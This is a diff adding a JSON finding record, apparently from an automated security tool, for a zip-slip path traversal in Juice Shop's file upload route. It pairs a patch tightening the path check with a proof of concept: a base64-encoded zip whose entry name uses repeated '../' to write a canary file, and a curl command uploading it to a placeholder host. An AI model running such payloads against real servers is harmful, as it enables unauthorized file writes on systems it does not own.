@@ -1,0 +1,21 @@
+{
+  "recipe": "84bcae0cf279f933",
+  "finding": "2d81390ddfac1daa",
+  "file": "routes/fileUpload.ts",
+  "repository": "https://github.com/satoridev01/juice-shop.git",
+  "revision": "10bb0f51ed43956675c77c16739617aad77f1709",
+  "original_fingerprint": "fb19a89804fdd2e5",
+  "hunks": [
+    {
+      "line": 33,
+      "old": [
+        "    if (absolutePath.includes(path.resolve('.'))) {"
+      ],
+      "new": [
+        "    if (absolutePath.startsWith(path.resolve('uploads/complaints') + path.sep)) {"
+      ]
+    }
+  ],
+  "poc": "printf %s 'UEsDBBQAAAAAAAAAAAAStF/bFgAAABYAAABnAAAALi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vYXBwL2pzcy1jYW5hcnktcmVhZC5kL2pzcy16aXAtMThlOTQwNjE5YWU3OTE3MDExMzFlZi0xL2pzcy16aXAtbGVhZjE4ZTk0MDYxOWFlNzkxNzAxMTMxZWZQSwECFAAUAAAAAAAAAAAAErRf2xYAAAAWAAAAZwAAAAAAAAAAAAAAAAAAAAAALi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vYXBwL2pzcy1jYW5hcnktcmVhZC5kL2pzcy16aXAtMThlOTQwNjE5YWU3OTE3MDExMzFlZi0xL2pzcy16aXAtbGVhZlBLBQYAAAAAAQABAJUAAACbAAAAAAA=' | base64 -d > /tmp/jsspector.zip\ncurl -i -sS \\\n  --request POST \\\n  --path-as-is \\\n  --url 'http://TARGET_HOST:3000/file-upload' \\\n  --form 'file=@/tmp/jsspector.zip;filename=jsspector.zip;type=application/zip'",
+  "benign_status": 400
+}
